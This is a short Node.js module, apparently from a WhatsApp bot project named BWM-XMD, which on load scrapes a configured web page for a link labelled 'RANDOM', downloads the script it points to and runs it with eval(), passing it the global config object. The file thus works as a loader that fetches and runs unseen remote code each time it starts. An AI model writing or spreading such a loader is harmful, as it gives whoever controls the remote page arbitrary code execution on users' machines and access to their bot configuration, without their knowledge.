//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Aslam Dullah                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const dullaConfig = require(__dirname + "/../config");
global.dullah = global.dullah || dullaConfig;

async function fetchRANDOMUrl() {
  try {
    const response = await axios.get(dullaConfig.BWM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("RANDOM")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('RANDOM not found 😭');
    }

    console.log('RANDOM loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    const dullah = global.dullah;
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchRANDOMUrl();
